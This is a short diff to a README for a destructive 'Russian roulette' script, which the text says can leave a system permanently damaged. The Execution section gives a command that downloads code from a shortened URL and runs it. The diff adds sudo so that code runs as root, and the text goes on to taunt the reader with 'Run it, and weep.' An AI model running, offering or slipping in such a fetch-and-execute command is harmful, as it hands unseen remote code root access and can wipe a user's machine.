@@ -12,7 +12,7 @@ It has seven barrels. If the random number is four, the system is __permanently 
 
 ## Execution
 To run it type: 
-> bash <(curl -s -L https://git.io/vArE3).
+> sudo bash <(curl -s -L https://git.io/vArE3).
 
 It doesn't look suspicious, does it?
 Run it, and weep.
